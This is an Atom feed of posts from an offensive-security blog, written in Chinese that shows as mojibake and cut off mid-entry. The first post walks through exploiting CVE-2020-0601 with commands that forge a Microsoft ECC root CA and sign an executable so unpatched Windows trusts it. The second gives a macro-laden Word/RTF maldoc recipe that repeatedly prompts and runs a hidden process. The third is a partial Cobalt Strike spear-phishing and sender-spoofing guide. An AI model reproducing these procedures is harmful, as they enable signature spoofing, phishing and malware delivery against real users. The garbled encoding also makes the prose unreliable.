<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Evi1cg&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://evi1cg.github.io/"/>
  <updated>2020-01-17T08:29:49.849Z</updated>
  <id>https://evi1cg.github.io/</id>
  
  <author>
    <name>Evi1cg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-0601</title>
    <link href="https://evi1cg.github.io/archives/cve_2020_0601.html"/>
    <id>https://evi1cg.github.io/archives/cve_2020_0601.html</id>
    <published>2020-01-17T01:58:45.000Z</published>
    <updated>2020-01-17T08:29:49.849Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20200117161050.png" alt=""></p><a id="more"></a><h2 id="0x00-CVE-2020-0601-æ¼æ´åŸç†"><a href="#0x00-CVE-2020-0601-æ¼æ´åŸç†" class="headerlink" title="0x00 CVE-2020-0601 æ¼æ´åŸç†"></a>0x00 CVE-2020-0601 æ¼æ´åŸç†</h2><p>å¼•ç”¨æˆ‘å¸å¤§ä½¬æ€»ç»“:<br><strong>1.åŸºç¡€çŸ¥è¯†ï¼š</strong><br>ECCç§é’¥+æ¤­åœ†æ›²çº¿=ECCå…¬é’¥</p><p><strong>2.æ¼æ´ï¼š</strong><br>å¾®è½¯çš„ç§é’¥+å¾®è½¯é€‰çš„æ¤­åœ†æ›²çº¿=å¾®è½¯æ ¹è¯ä¹¦é‡Œé¢çš„å…¬é’¥<br>é»‘å®¢çš„ç§é’¥+é»‘å®¢é€‰çš„æ¤­åœ†æ›²çº¿=å¾®è½¯æ ¹è¯ä¹¦é‡Œé¢çš„å…¬é’¥<br>ä¸åŒçš„æ¤­åœ†æ›²çº¿å’Œä¸åŒçš„ç§é’¥ï¼Œèƒ½äº§ç”Ÿå€¼ä¸€æ¨¡ä¸€æ ·çš„å…¬é’¥ã€‚<br>win10å¼€å§‹é»˜è®¤æ·»åŠ äº†å¾®è½¯çš„ECCæ ¹è¯ä¹¦ï¼Œåœ¨åšè¯ä¹¦é“¾éªŒè¯æ—¶ï¼Œä¼šä¸€ç›´éªŒè¯åˆ°å¾®è½¯æ ¹è¯ä¹¦é‡Œé¢çš„å…¬é’¥çš„hashå€¼ï¼Œè¿™ä¸ªå€¼ç›´æ¥å†™åœ¨äº†crypt32.dllé‡Œé¢ï¼ŒéªŒè¯æ—¶æ²¡æœ‰å¯¹æ¯”æ˜¯ä¸æ˜¯åŒä¸€ä¸ªæ¤­åœ†æ›²çº¿ï¼Œåªå¯¹æ¯”äº†å…¬é’¥å€¼å°±ä¸‡äº‹å¤§å‰äº†ï¼Œå¯¼è‡´äº†é»‘å®¢æ‹¿è‡ªå·±çš„ç§é’¥éšä¾¿ç­¾ä¸ªåï¼Œéƒ½ä»¥ä¸ºæ˜¯å¾®è½¯è‡ªå·±ç­¾çš„ã€‚</p><p><strong>3.win7å—å½±å“å—ï¼Ÿ</strong><br>win7æ²¡æœ‰é»˜è®¤æ·»åŠ å¾®è½¯çš„ECCæ ¹è¯ä¹¦ï¼Œcrypt32.dllé‡Œé¢ä¹Ÿæ²¡è¿™ä¸ªhashå€¼ï¼Œæ²¡æ³•ç›´æ¥å¯¹æ¯”é€šè¿‡ã€‚<br>ç»“è®ºï¼šWindows 7ä¸å—å½±å“</p><p><strong>4.XPã€2003å—å½±å“å—ï¼Ÿ</strong><br>ECCæ˜¯ä¸ªä»€ä¹ˆé¬¼ï¼Ÿ</p><p><strong>5.æˆ‘èƒ½è·‘å‡ºå¾®è½¯æ ¹è¯ä¹¦é‡Œé¢çš„ç§é’¥å—ï¼Ÿ</strong><br>æ´—æ´—ç¡å§ã€‚</p><h2 id="0x01-CVE-2020-0601-æ¼æ´åˆ©ç”¨"><a href="#0x01-CVE-2020-0601-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x01 CVE-2020-0601 æ¼æ´åˆ©ç”¨"></a>0x01 CVE-2020-0601 æ¼æ´åˆ©ç”¨</h2><p>é¦–å…ˆæ¥çœ‹ä¸‹å¼€æºçš„å·¥å…·ï¼š</p><blockquote><p><a href="https://github.com/kudelskisecurity/chainoffools" target="_blank" rel="noopener">https://github.com/kudelskisecurity/chainoffools</a></p></blockquote><p>è¿™ä¸ªå·¥å…·ä½¿ç”¨äº† <code>USERTrust ECC Certification Authority</code>çš„è¯ä¹¦æ¥è¿›è¡ŒéªŒè¯ã€‚<br>å‚ç…§è¿™æ¬¾å·¥å…·ç”Ÿæˆè¯ä¹¦ï¼Œå¹¶å¯¹exeè¿›è¡Œç­¾åï¼ŒæŸ¥çœ‹ç­¾åä¿¡æ¯å¦‚ä¸‹ï¼š<br><img src="/usr/uploads/2019/15792276480740.jpg" alt="-w469"></p><p>ç”±äºä¸å­˜åœ¨æ ¹è¯ä¹¦ï¼Œæ‰€ä»¥ä¼šçœ‹åˆ°éªŒè¯å¹¶æ²¡æœ‰é€šè¿‡ï¼Œè®¿é—®ç½‘ç«™ï¼š<br><a href="https://usertrustecccertificationauthority-ev.comodoca.com/" target="_blank" rel="noopener">https://usertrustecccertificationauthority-ev.comodoca.com/</a><br><img src="/usr/uploads/2019/15792277648477.jpg" alt="-w920"><br>ä¼šåœ¨ç³»ç»Ÿå®‰è£…æ ¹è¯ä¹¦ï¼Œè¿™æ ·å°±ä¼šè®©ç­¾åæ­£å¸¸ã€‚<br><img src="/usr/uploads/2019/15792280338151.jpg" alt="-w886"></p><p>å¦‚æœè¦ä¸å®‰è£…åˆ«çš„è¯ä¹¦è®©ç­¾åæ­£å¸¸å°±éœ€è¦å¯»æ‰¾ç³»ç»Ÿé»˜è®¤ä¿¡ä»»çš„ECCç­¾åçš„æ ¹è¯ä¹¦ã€‚</p><h2 id="0x02-é»˜è®¤ECCç­¾åæ ¹è¯ä¹¦æµ‹è¯•"><a href="#0x02-é»˜è®¤ECCç­¾åæ ¹è¯ä¹¦æµ‹è¯•" class="headerlink" title="0x02 é»˜è®¤ECCç­¾åæ ¹è¯ä¹¦æµ‹è¯•"></a>0x02 é»˜è®¤ECCç­¾åæ ¹è¯ä¹¦æµ‹è¯•</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹é»˜è®¤æœ‰å“ªäº›æ ¹è¯ä¹¦ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir cert:\localmachine\root | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.FriendlyName <span class="nomarkup">-like</span> <span class="string">"*ECC*"</span> &#125;</span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15792284064405.jpg" alt="-w974"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œé¢æœ‰3ä¸ªç³»ç»Ÿé»˜è®¤çš„ECCç­¾åçš„æ ¹è¯ä¹¦ã€‚æˆ‘ä»¬éšæ„å¯¼å‡ºå…¶ä¸­ä¸€ä¸ªæ ¹è¯ä¹¦ï¼š<br>cmdè¾“å…¥certmgr.mscæ‰“å¼€è¯ä¹¦ç®¡ç†ï¼Œæ‰¾åˆ°ECCç­¾åæ ¹è¯ä¹¦è¿›è¡Œå¯¼å‡ºï¼š<br><img src="/usr/uploads/2019/15792291515070.jpg" alt="-w1174"></p><p>å¯¼å‡ºç›´æ¥é€‰æ‹©Base64ç¼–ç é‚£ä¸ªå°±è¡Œã€‚</p><p>ä½¿ç”¨opensslæŸ¥çœ‹è¯ä¹¦ä¿¡æ¯ï¼š<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -<span class="keyword">in</span> ca<span class="selector-class">.cer</span> -text -noout</span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15792293462074.jpg" alt="-w1179"></p><p>æŸ¥çœ‹<a href="https://github.com/kudelskisecurity/chainoffools/blob/master/gen-key.py" target="_blank" rel="noopener"><code>gen-key.py</code></a> åŠREADMEï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æå–è¯ä¹¦çš„å…¬é’¥ Public Key å’Œåºåˆ—å·Serial Number ä»¥åŠSubjectã€‚</p><p>ä¸ºäº†æ–¹ä¾¿æå–ï¼Œå¯ä»¥ä½¿ç”¨powershellï¼Œè¿™æ ·å°±æŠŠæ‰€éœ€è¦çš„å†…å®¹æå–å‡ºæ¥äº†<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir cert:\localmachine\root | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.FriendlyName <span class="nomarkup">-like</span> <span class="string">"*ECC*"</span> &#125; | %&#123;[bitconverter]::tostring(<span class="variable">$_</span>.publickey.encodedkeyvalue.rawdata).replace(<span class="string">'-'</span>,<span class="string">''</span>);<span class="variable">$_</span>.SerialNumber;<span class="variable">$_</span>.subject;<span class="string">"="</span>*<span class="number">200</span>&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15792300092616.jpg" alt="-w1679"></p><p>æˆ‘ä»¬éšæ„é€‰æ‹©ä¸€ä¸ªï¼Œæ¯”å¦‚ï¼š<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">04C711162A761D568EBEB96265D4C3CEB4F0C330EC8F6DD76E39BCC849ABABB8E34378D581065DEFC77D9FCED6B39075DE0CB090DE23BAC8D13E67E019A91B86311E5F342DEE17FD15FB7E278A32A1EAC98FC97E18CB2F3B2C487A7DA6F40107AC14982666DC7CCD8F4053677BB999EC85<span class="attribute">CN</span>=Microsoft ECC Product Root Certificate Authority 2018, <span class="attribute">O</span>=Microsoft Corporation, <span class="attribute">L</span>=Redmond, <span class="attribute">S</span>=Washington, <span class="attribute">C</span>=US</span><br></pre></td></tr></table></figure></p><p>å‚ç…§POCé‡Œé¢çš„READMEæ¥è¿›è¡Œç”Ÿæˆï¼š<br>ç”Ÿæˆkeyæ¨¡ç‰ˆï¼š<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl ecparam -name secp384r1 -genkey -noout -<span class="keyword">out</span> p384-key.pem -param_enc <span class="keyword">explicit</span></span><br></pre></td></tr></table></figure></p><p>æ›¿æ¢<code>gen-key.py</code>é‡Œé¢çš„å…¬é’¥å­—ç¬¦ä¸²ã€‚ç”Ÿæˆå¯¹åº”çš„ç§é’¥ï¼š<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> gen-key.<span class="keyword">py</span></span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨è·å–çš„åºåˆ—å·å’Œsubjç”Ÿæˆå‡å†’çš„CA<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -key p384-key-rogue<span class="selector-class">.pem</span> -new -out ca-rogue<span class="selector-class">.pem</span> -x509 -set_serial <span class="number">0</span>x14982666DC7CCD8F4053677BB999EC85 -subj <span class="string">"/C=US/ST=Washington/L=Redmond/O=Microsoft Cor poratio/CN=Microsoft ECC TS Root Certificate Authority 2018"</span></span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥ç”Ÿæˆç§é’¥å’Œè¯ä¹¦ï¼Œåœ¨è¿™é‡Œéœ€è¦æ›¿æ¢ä¸€ä¸‹é¡¹ç›®é‡Œé¢çš„<code>openssl.cnf</code>ä¸ºä»¥ä¸‹å†…å®¹ï¼š<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[ req ]</span></span><br><span class="line"><span class="attr">default_bits</span>            = <span class="number">2048</span>                  # RSA key size</span><br><span class="line"><span class="attr">encrypt_key</span>             = <span class="literal">yes</span>                   # Protect private key</span><br><span class="line"><span class="attr">default_md</span>              = sha1                  # MD to use</span><br><span class="line"><span class="attr">utf8</span>                    = <span class="literal">yes</span>                   # Input is UTF-<span class="number">8</span></span><br><span class="line"><span class="attr">string_mask</span>             = utf8only              # Emit UTF-<span class="number">8</span> strings</span><br><span class="line"><span class="attr">prompt</span>                  = <span class="literal">yes</span>                   # Prompt for DN</span><br><span class="line"><span class="attr">distinguished_name</span>      = codesign_dn           # DN template</span><br><span class="line"><span class="attr">req_extensions</span>          = codesign_reqext       # Desired extensions</span><br><span class="line"></span><br><span class="line"><span class="section">[ codesign_dn ]</span></span><br><span class="line"><span class="attr">countryName</span>             = <span class="string">"1. Country Name (2 letters) (eg, DK)       "</span></span><br><span class="line"><span class="attr">countryName_max</span>         = <span class="number">2</span></span><br><span class="line"><span class="attr">stateOrProvinceName</span>     = <span class="string">"2. State or Province Name   (eg, Denmark)   "</span></span><br><span class="line"><span class="attr">localityName</span>            = <span class="string">"3. Locality Name            (eg, Copenhagen)     "</span></span><br><span class="line"><span class="attr">organizationName</span>        = <span class="string">"4. Organization Name        (eg, ollypwn)  "</span></span><br><span class="line"><span class="attr">organizationalUnitName</span>  = <span class="string">"5. Organizational Unit Name (eg, ollypwn)  "</span></span><br><span class="line"><span class="attr">commonName</span>              = <span class="string">"6. Common Name              (eg, Olly Pwn)"</span></span><br><span class="line"><span class="attr">commonName_max</span>          = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ codesign_reqext ]</span></span><br><span class="line"><span class="attr">basicConstraints</span> = CA:<span class="literal">FALSE</span></span><br><span class="line"><span class="attr">keyUsage</span>                = critical,digitalSignature</span><br><span class="line"><span class="attr">extendedKeyUsage</span>        = critical,codeSigning</span><br><span class="line"><span class="attr">subjectKeyIdentifier</span>    = hash</span><br><span class="line"></span><br><span class="line"><span class="section">[ usr_cert ]</span></span><br><span class="line"><span class="attr">basicConstraints</span> = CA:<span class="literal">FALSE</span></span><br><span class="line"><span class="attr">keyUsage</span> = digitalSignature</span><br><span class="line"><span class="attr">extendedKeyUsage</span> = codeSigning  </span><br><span class="line"><span class="section">[ v3_req ]</span></span><br><span class="line"><span class="attr">keyUsage</span> = critical,digitalSignature</span><br><span class="line"><span class="attr">extendedKeyUsage</span> = critical,codeSigning</span><br></pre></td></tr></table></figure></p><p>ç”Ÿæˆï¼š<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem</span><br><span class="line"></span><br><span class="line">openssl req -key prime256v1-privkey<span class="selector-class">.pem</span> -config openssl<span class="selector-class">.cnf</span> -new -out prime256v1<span class="selector-class">.csr</span> -subj <span class="string">"/C=US/ST=Washington/L=Redmond/O=Microsoft Cor poration/CN=Microsoft ECC TS Root Certificate Authority 2018"</span></span><br><span class="line"></span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> prime256v1<span class="selector-class">.csr</span> -CA ca-rogue<span class="selector-class">.pem</span> -CAkey p384-key-rogue<span class="selector-class">.pem</span> -CAcreateserial -out client-cert<span class="selector-class">.pem</span> -days <span class="number">500</span> -extensions v3_req -extfile openssl.cnf</span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15792324087218.jpg" alt=""></p><p>å°†è¯ä¹¦è½¬æ¢ä¸ºpkcs12:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -<span class="keyword">in</span> client-cert<span class="selector-class">.pem</span> -inkey prime256v1-privkey<span class="selector-class">.pem</span> -certfile ca-rogue<span class="selector-class">.pem</span> -out cert.p12</span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15792312539879.jpg" alt=""></p><p>ä½¿ç”¨osslsigncodeæˆ–è€…signtoolç­¾åï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osslsigncode <span class="keyword">sign</span> -pkcs12 ./cert.p12 -t http://timestamp.verisign.<span class="keyword">com</span>/scripts/timstamp.dll -in putty.<span class="keyword">exe</span> -out putty_signed.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè½¬æ¢ä¸ºpkcs12æ—¶æ·»åŠ äº†å¯†ç ï¼Œç­¾åçš„æ—¶å€™éœ€è¦æŒ‡å®šï¼š<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osslsigncode <span class="built_in">sign</span> -pkcs12 ./cert.p12 -t http://timestamp.verisign.com/scripts/timstamp.dll -<span class="keyword">in</span> putty.exe -<span class="keyword">out</span> putty_signed.exe -<span class="keyword">pass</span> <span class="number">123123</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15792314577332.jpg" alt=""></p><p>å°†ç­¾åå¥½çš„EXEæ”¾åˆ°æœªæ‰“è¡¥ä¸çš„Win10 ä¸Šé¢æŸ¥çœ‹ç­¾åä¿¡æ¯ï¼š<br><img src="/usr/uploads/2019/15792324760768.jpg" alt="-w916"></p><h2 id="0x03-å…³äºHTTPSåŠ«æŒ"><a href="#0x03-å…³äºHTTPSåŠ«æŒ" class="headerlink" title="0x03 å…³äºHTTPSåŠ«æŒ"></a>0x03 å…³äºHTTPSåŠ«æŒ</h2><p>HTTPSåŠ«æŒéœ€è¦ä¸­é—´äººï¼Œå¦å¤–éœ€è¦ç”Ÿæˆæ‰€éœ€è¦çš„è¯ä¹¦æ–‡ä»¶ï¼Œç”Ÿæˆæ–¹æ³•å¯å‚è€ƒé¡¹ç›®ï¼š</p><blockquote><p><a href="https://github.com/ollypwn/cve-2020-0601" target="_blank" rel="noopener">https://github.com/ollypwn/cve-2020-0601</a></p></blockquote><p>ç»“æœå¦‚ä¸‹å›¾ï¼š<br><img src="/usr/uploads/2019/15792482794630.jpg" alt="-w1464"></p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>å…³äºæ­¤æ¼æ´ï¼Œç­¾åçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„å…æ€æ•ˆæœä¸€èˆ¬ï¼Œä½†æ˜¯ç»“åˆä¸­é—´äººé’“é±¼è¿˜æ˜¯å¾ˆæ£’çš„ã€‚å»ºè®®å°ä¼™ä¼´ä»¬å°½å¿«å‡çº§ç³»ç»Ÿã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://blogpics-1251691280.file.myqcloud.com/imgs/20200117161050.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="å¥‡æŠ€æ·«å·§" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="phishing" scheme="https://evi1cg.github.io/tags/phishing/"/>
    
  </entry>
  
  <entry>
    <title>ä¸ç‚¹æˆ‘å°±å¼¹å¼¹å¼¹</title>
    <link href="https://evi1cg.github.io/archives/popups_advanced_maldoc.html"/>
    <id>https://evi1cg.github.io/archives/popups_advanced_maldoc.html</id>
    <published>2019-09-06T06:49:51.000Z</published>
    <updated>2020-08-03T09:25:27.564Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20190906145344.png" alt=""></p><a id="more"></a><h2 id="0x00-officeå®çš„åˆ©ç”¨"><a href="#0x00-officeå®çš„åˆ©ç”¨" class="headerlink" title="0x00 officeå®çš„åˆ©ç”¨"></a>0x00 officeå®çš„åˆ©ç”¨</h2><p>ä»<a href="https://medium.com/walmartlabs/pesky-old-style-macro-popups-advanced-maldoc-techniques-8868ed02d845" target="_blank" rel="noopener">walmartlabs</a>å­¦æ¥çš„ï¼Œè®©å®å¤šå¼¹å‡ æ¬¡ï¼Œæé«˜æˆåŠŸç‡ã€‚</p><h4 id="åˆ›å»ºæ–¹å¼1"><a href="#åˆ›å»ºæ–¹å¼1" class="headerlink" title="åˆ›å»ºæ–¹å¼1:"></a>åˆ›å»ºæ–¹å¼1:</h4><p>1ã€ åˆ›å»ºä¸€ä¸ªåŒ…å«å®çš„Excelï¼Œè®©è¿™ä¸ªExcelåœ¨å¼€å¯å®çš„çŠ¶æ€ä¸‹ï¼Œæ‰“å¼€å¯ä»¥æ‰§è¡Œï¼Œä¿å­˜ä¸ºï¼ˆxls æˆ–è€… xlsm ï¼‰æ¯”å¦‚æ·»åŠ ä»¥ä¸‹å®ï¼š<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> Workbook_Open()    Debugging<span class="keyword">End</span> <span class="keyword">Sub</span><span class="keyword">Public</span> <span class="keyword">Function</span> Debugging() As Variant    <span class="keyword">Dim</span> Str As <span class="built_in">String</span>    Str = <span class="string">"calc.exe"</span>    <span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">0</span>    strComputer = <span class="string">"."</span>    <span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">"winmgmts:\\"</span> &amp; strComputer &amp; <span class="string">"\root\cimv2"</span>)    <span class="keyword">Set</span> objStartup = objWMIService.<span class="keyword">Get</span>(<span class="string">"Win32_ProcessStartup"</span>)    <span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_    objConfig.ShowWindow = HIDDEN_WINDOW    <span class="keyword">Set</span> objProcess = <span class="built_in">GetObject</span>(<span class="string">"winmgmts:\\"</span> &amp; strComputer &amp; <span class="string">"\root\cimv2:Win32_Process"</span>)    objProcess.Create Str, <span class="literal">Null</span>, objConfig, intProcessID<span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure></p><p>2ã€åˆ›å»ºä¸€ä¸ªwordæ–‡æ¡£ï¼Œå†æ’å…¥å¤„é€‰æ‹©æ’å…¥å¯¹è±¡,ç„¶åé€‰æ‹©æ’å…¥å¯¹è±¡-&gt;ç”±æ–‡ä»¶åˆ›å»º-&gt;é€‰æ‹©åˆšåˆšåˆ›å»ºå¥½çš„åŒ…å«å®ä»£ç çš„Excel (<code>ä¸è¦ç‚¹</code>é“¾æ¥åˆ°æ–‡ä»¶å’Œæ˜¾ç¤ºä¸ºå›¾æ ‡ï¼)ï¼Œæƒ³å¼¹å‡ æ¬¡ï¼Œå°±æ’å‡ æ¬¡ã€‚ğŸ¤”<br>3ã€ä½¿ç”¨å¿«æ·é”®éšè—æ’å…¥çš„å¯¹è±¡ï¼Œå¿«æ·é”®ä¸ºâ€Ctrl+Shift+Hâ€<br>4ã€å°†wordæ–‡æ¡£å¦å­˜ä¸º<code>RTF</code>æ ¼å¼<br>5ã€ç¼–è¾‘RTFæ–‡æ¡£ï¼Œä¿®æ”¹<code>\objemb</code> ä¸º<code>\objupdate\objemb</code>, ä¹‹åå°†rtfä¿®æ”¹ä¸ºdocã€‚</p><h4 id="åˆ›å»ºæ–¹å¼2"><a href="#åˆ›å»ºæ–¹å¼2" class="headerlink" title="åˆ›å»ºæ–¹å¼2:"></a>åˆ›å»ºæ–¹å¼2:</h4><p>1-3ã€åŒä¸Š<br>4ã€å°†wordæ–‡æ¡£å¦å­˜ä¸º<code>.docx</code>æ ¼å¼ï¼Œå…³é—­å†é‡æ–°æ‰“å¼€docx<br>5ã€å°†æ–°çš„docxæ ¼å¼æ–‡ä»¶å¦å­˜ä¸º<code>rtf</code>æ ¼å¼ï¼Œä¹‹åä¿®æ”¹rtfä¸ºdocã€‚</p><h4 id="åˆ›å»ºæ–¹å¼3"><a href="#åˆ›å»ºæ–¹å¼3" class="headerlink" title="åˆ›å»ºæ–¹å¼3:"></a>åˆ›å»ºæ–¹å¼3:</h4><p>1ã€ä½¿ç”¨<a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/" target="_blank" rel="noopener">Excel 4.0 å®</a>åˆ›å»ºåŒ…å«å®çš„Excelæ–‡ä»¶ã€‚<br>2-5ã€åŒä¸Š</p><h4 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h4><p><img src="/usr/uploads/2019/macro.gif" alt="macro"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://blogpics-1251691280.file.myqcloud.com/imgs/20190906145344.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="phishing" scheme="https://evi1cg.github.io/tags/phishing/"/>
    
      <category term="macro" scheme="https://evi1cg.github.io/tags/macro/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike Spear Phish</title>
    <link href="https://evi1cg.github.io/archives/spear_phish.html"/>
    <id>https://evi1cg.github.io/archives/spear_phish.html</id>
    <published>2019-06-05T08:08:34.000Z</published>
    <updated>2019-06-05T09:27:07.918Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/usr/uploads/2019/15597224054660.jpg" alt=""></p><a id="more"></a><h2 id="0x00-ç®€ä»‹"><a href="#0x00-ç®€ä»‹" class="headerlink" title="0x00 ç®€ä»‹"></a>0x00 ç®€ä»‹</h2><p>å…³äºSpear phish å’Œå‘ä»¶äººä¼ªé€ çš„å·¥å…·æœ‰å¾ˆå¤šä¸ªï¼Œæ¯”å¦‚<a href="https://getgophish.com/" target="_blank" rel="noopener">gophish</a>ã€<a href="https://github.com/lunarca/SimpleEmailSpoofer" target="_blank" rel="noopener">SimpleEmailSpoofer</a>ã€å‘½ä»¤è¡Œå·¥å…·swaksç­‰ï¼Œæ¯ä¸ªå·¥å…·éƒ½æœ‰å…¶ç‰¹ç‚¹ï¼Œå½“ç„¶Cobalt Strikeä¹Ÿæœ‰æ­¤åŠŸèƒ½ã€‚å®˜æ–¹ä»‹ç»<a href="https://cobaltstrike.com/help-spear-phish" target="_blank" rel="noopener">æˆ³æˆ‘</a>ã€‚ä»Šå¤©ä¸»è¦æ¥ä»‹ç»ä¸€ä¸‹CSé‡Œé¢çš„æ­¤åŠŸèƒ½æ€ä¹ˆä½¿ç”¨ã€‚</p><h2 id="0x01-CS-Spear-Phish"><a href="#0x01-CS-Spear-Phish" class="headerlink" title="0x01 CS Spear Phish"></a>0x01 CS Spear Phish</h2><p>CSçš„Spear Phishä½ç½®åœ¨ï¼š<br><img src="/usr/uploads/2019/15597229460786.jpg" alt="-w274"></p><p>ä¸€å¼ å›¾è¯´æ˜åŠŸèƒ½ï¼š<br><img src="/usr/uploads/2019/15597228740190.jpg" alt=""></p><p>ä½¿ç”¨æ­¤åŠŸèƒ½çš„å‰ææ˜¯éœ€è¦æœ‰ä¸€ä¸ªsmtpæœåŠ¡å™¨æ¥ä¾›æˆ‘ä»¬æ¥è½¬å‘é‚®ä»¶ï¼Œå½“ç„¶å¯ä»¥ä½¿ç”¨å…¬å…±smtpæœåŠ¡ï¼Œå¦å¤–ä¹Ÿå¯ä»¥å‚è€ƒ<a href="https://evi1cg.github.io/archives/Email_spoofing.html">ã€ŠSomething about email spoofingã€‹</a> ä¸­æåˆ°çš„æ–¹æ³•æ¥æ­å»ºã€‚<br>è¿™é‡Œçš„ä½¿ç”¨å¾ˆç®€å•ï¼Œé¦–å…ˆæ„é€ ç›®æ ‡åˆ—è¡¨ï¼Œä½¿ç”¨ï¼š<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mail    <span class="built_in">name</span></span><br><span class="line">mail    <span class="built_in">name</span></span><br></pre></td></tr></table></figure></p><blockquote><p>ä¸­é—´çš„åˆ†éš”ç¬¦ä¸º[tab],å¯ä»¥ä¸æ·»åŠ name</p></blockquote><p>æ·»åŠ å¥½ä»¥åå°±æ˜¯è¿™ä¸ªæ ·å­ï¼š<br><img src="/usr/uploads/2019/15597237296089.jpg" alt="-w551"></p><p>ä¸‹é¢ï¼Œè¦é…ç½®å‘ä»¶æ¨¡æ¿ï¼Œè¿™é‡Œé…ç½®å¾ˆç®€å•ï¼Œåªéœ€è¦å¤åˆ¶ä¸€ä»½åŸå§‹é‚®ä»¶å³å¯ï¼Œæ¯”å¦‚ä¸€ä»½å¯†ç é‡ç½®é‚®ä»¶ï¼š<br><img src="/usr/uploads/2019/15597240250480.jpg" alt="-w1115"></p><p>é€‰æ‹©æ˜¾ç¤ºåŸå§‹é‚®ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹ä¿å­˜ã€‚</p><p>åœ¨è¿™é‡Œå¦‚æœè¦ä¼ªé€ å‘ä»¶äººï¼Œéœ€è¦ä¿®æ”¹<code>From:</code><br><img 